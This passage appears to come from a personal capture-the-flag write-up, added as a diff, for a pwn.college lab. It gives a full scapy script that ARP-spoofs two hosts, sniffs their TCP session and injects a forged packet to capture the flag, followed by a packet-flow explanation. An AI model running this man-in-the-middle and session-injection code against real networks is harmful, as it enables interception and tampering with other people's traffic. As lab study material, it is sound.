@@ -351,3 +351,124 @@ ssh -i key hacker@dojo.pwn.college
 #ok, it is not so good as I thought, and I should try to use scripts instead of manually using the terminals
 ```
 
+Ok, finally I figured it out with the help of discord friends! As we know we can't manually use the terminals so we should use python scripts with **scapy**. There'is a very cool function called {{< spoiler >}} sniffer {{</ spoiler >}} so we could use it to accept packets between x.0.0.3 and x.0.0.4
+
+```python
+//a.py ==>scripts
+from scapy.all import *
+#first craft a ARP packet to insert into them
+#if we can use `ip addr add 10.0.0.3/16 dev eth0` would be better maybe but this time I seem not to use it.
+sendp(Ether(src=get_if_hwaddr("eth0")) / ARP(op="is-at",hwsrc=get_if_hwaddr("eth0"),
+            psrc="10.0.0.3",pdst="10.0.0.4"),iface="eth0") #tell 10.0.0.4，where 10.0.0.3 it is
+sendp(Ether(src=get_if_hwaddr("eth0")) / ARP(op="is-at",hwsrc=get_if_hwaddr("eth0"),
+            psrc="10.0.0.4",pdst="10.0.0.3"),iface="eth0") #tell 10.0.0.3，where 10.0.0.4 it is
+
+#global!
+key = ''
+dst = ''
+src = ''
+ipdst = ''
+ipsrc = ''
+ipflags = ''
+sport = 0
+dport = 31337
+flags = ''
+seq = 0
+ack = 0
+def CallBack(packet):
+    #print ( packet.show() )
+    
+    if packet.haslayer('TCP'):
+        #print ("10.0.0.4 sport:",packet['TCP'].sport)
+        #print ("dest Port:",packet['TCP'].dport) #31337
+        global key 
+        global dst
+        global src 
+        global ipdst 
+        global ipsrc
+        global ipflags
+        global sport
+        global dport
+        global flags
+        global seq
+        global ack
+        print("src:",packet['IP'].src)
+        print("flags:",packet['TCP'].flags)
+        print ("seq:",packet['TCP'].seq,"ack:",packet['TCP'].ack)
+        try:
+            print("load:",packet['TCP'].load)
+            if packet['IP'].src=='10.0.0.4' and packet['TCP'].load != b'ECHO\n':
+                key = packet['TCP'].load
+            if packet['IP'].src == '10.0.0.4' and packet['TCP'].load == b'ECHO\n':
+                print("echo!!")
+                print(packet.show())
+                
+            if packet['IP'].src == '10.0.0.3' and packet['TCP'].load == b'COMMANDS:\nECHO\nFLAG\nCOMMAND:\n':
+                print("COMMAND!!")
+                print(packet.show())
+                ipdst = packet['IP'].src
+                ipsrc = packet['IP'].dst
+                flags = 'PA'
+                ipflags = packet['IP'].flags
+                dst = packet['Ethernet'].src
+                src = packet['Ethernet'].dst
+                dport = packet['TCP'].sport
+                sport = packet['TCP'].dport
+                seq = packet['TCP'].ack
+                ack = packet['TCP'].seq+29
+                raw_pkt = Raw(load='FLAG\n')
+                (Ether(src=src,dst=dst) / IP(src=ipsrc,dst=ipdst,flags=ipflags) / 
+                TCP(dport=dport,sport=sport,seq=seq,ack=ack,flags=flags) / raw_pkt).display()
+                sendp(Ether(src=src,dst=dst) / IP(src=ipsrc,dst=ipdst,flags=ipflags) / 
+                TCP(dport=dport,sport=sport,seq=seq,ack=ack,flags=flags) / raw_pkt,iface="eth0")
+
+        except Exception as e:
+            #print(e)
+            print("no load")
+            pass
+        print("=========================")
+        #print ("offset:",packet['TCP'].dataofs) #data offset
+
+filter="tcp"
+
+#the key function!
+sniff(filter=filter, prn=CallBack, iface='eth0', count=50) #count of data packet
+```
+
+And I should tell the principle and theory here: 
+
+```shell
+4 -> 3 SYN
+3 -> 4 SYNACK
+4 -> 3 ACK
+3 -> 4 PSHACK Secret
+4 -> 3 ACK
+4 -> 3 PSHACK Key data
+3 -> 4 ACK
+3 -> 4 PSHACK COMMANDLIST (contain echo and flag)
+4 -> 3 ACK
+
+#we should replace the ECHO packet from 4 or be quicker than it
+4 -> 3 PSHACK ECHO
+replace with
+4 -> 3 PSHACK FLAG
+#and we can see the flag here
+
+3 -> 4 ACK
+4 -> 3 PSHACK hello world
+3 -> 4 ACK
+3 -> 4 PSHACK hello world
+4 -> 3 ACK
+4 -> 3 FINACK
+3 -> 4 FINACK
+4 -> 3 ACK
+```
+
+what we should do is to check the packet of `COMMAND` and the packet of `ECHO` , then craft a `FLAG` packet like `ECHO` but quicker than it as soon as we get the packet of `COMMAND`. The ipsrc, ipdst, src, dst, dport, sport, seq, ack, flags, ipflags are the most important to get.
+
+```shell
+/challenge/run
+python a.py
+#wait and get flag
+```
+
